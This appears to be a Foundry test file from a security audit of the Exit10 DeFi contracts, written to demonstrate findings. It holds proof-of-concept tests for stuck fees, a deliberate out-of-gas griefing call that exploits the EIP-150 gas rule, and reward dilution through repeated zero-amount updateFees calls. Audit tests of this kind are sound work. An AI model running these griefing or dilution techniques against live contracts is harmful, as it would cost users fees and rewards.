// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import { Test, console } from 'forge-std/Test.sol';
import { ABaseExit10Test, FeeSplitter } from './ABaseExit10.t.sol';
import { ISwapper } from '../src/interfaces/ISwapper.sol';
import { INPM } from '../src/interfaces/INonfungiblePositionManager.sol';
import { ERC20 } from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract AuditTest is ABaseExit10Test {
  function test_Exit10_claimAndDistributeFees_LossOfFeesIfIncreaseLiquidityReverts() public {
    // Generate liquidity and fees
    _bootstrapLock(10_000e6, 1 ether);
    _skipBootstrap();
    _createBond(100_000e6, 10 ether);
    _generateFees(address(token0), address(token1), 1000e6);

    // Assume call to nonfungiblePositionManager.increaseLiquidity reverts
    vm.mockCallRevert(nonfungiblePositionManager, abi.encodeWithSelector(INPM.increaseLiquidity.selector), '');

    // Call function
    exit10.claimAndDistributeFees();

    // FeeSplitter is empty
    uint256 feesClaimed0 = token0.balanceOf(feeSplitter);
    uint256 feesClaimed1 = token1.balanceOf(feeSplitter);

    assertEq(feesClaimed0, 0);
    assertEq(feesClaimed1, 0);

    // Fees are stuck in exit10 contract
    assertGt(token0.balanceOf(address(exit10)), 0);
    assertGt(token1.balanceOf(address(exit10)), 0);
  }

  function test_Exit10_claimAndDistributeFees_IntentionalRevert() public {
    // Generate liquidity and fees
    _bootstrapLock(10_000e6, 1 ether);
    _skipBootstrap();
    _createBond(100_000e6, 10 ether);
    _generateFees(address(token0), address(token1), 1000e6);

    // Call function and supply a gas limit such that the call to "increaseLiquidity()" reverts due to OOG.
    // The function still continues execution since EIP150 will save 1/64 of available gas, enough to
    // execute the return in the catch clause.
    exit10.claimAndDistributeFees{ gas: 200_000 }();

    // FeeSplitter is empty
    uint256 feesClaimed0 = token0.balanceOf(feeSplitter);
    uint256 feesClaimed1 = token1.balanceOf(feeSplitter);

    assertEq(feesClaimed0, 0);
    assertEq(feesClaimed1, 0);

    // Fees are stuck in exit10 contract
    assertGt(token0.balanceOf(address(exit10)), 0);
    assertGt(token1.balanceOf(address(exit10)), 0);
  }

  function test_Masterchef_updateRewards_DiluteWithZeroAmount() public {
    // Generate liquidity and fees
    _bootstrapLock(10_000e6, 1 ether);
    _skipBootstrap();
    _createBond(100_000e6, 10 ether);
    _generateFees(address(token0), address(token1), 100_000e6);

    exit10.claimAndDistributeFees();

    // Normal call to updateFees to trigger distribution
    FeeSplitter(feeSplitter).updateFees(type(uint256).max);

    console.log('MC0 RewardRate:', masterchef0.rewardRate());
    console.log('MC0 PeriodFinish:', masterchef0.periodFinish());
    console.log('MC1 RewardRate:', masterchef1.rewardRate());
    console.log('MC1 PeriodFinish:', masterchef1.periodFinish());
    console.log('=============================================');

    for (uint256 index = 0; index < 10; index++) {
      skip(1 days);

      // Call updateFees with 0 amount
      FeeSplitter(feeSplitter).updateFees(0);

      console.log('MC0 RewardRate:', masterchef0.rewardRate());
      console.log('MC0 PeriodFinish:', masterchef0.periodFinish());
      console.log('MC1 RewardRate:', masterchef1.rewardRate());
      console.log('MC1 PeriodFinish:', masterchef1.periodFinish());
      console.log('=============================================');
    }
  }
}
